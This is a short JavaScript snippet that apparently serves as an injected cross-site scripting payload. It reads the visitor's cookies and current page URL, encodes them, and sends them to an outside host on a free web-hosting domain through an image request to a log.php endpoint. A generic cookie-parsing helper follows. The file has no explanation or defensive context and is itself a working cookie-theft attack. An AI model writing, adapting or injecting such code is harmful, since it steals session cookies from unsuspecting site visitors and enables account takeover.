//Gen data
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}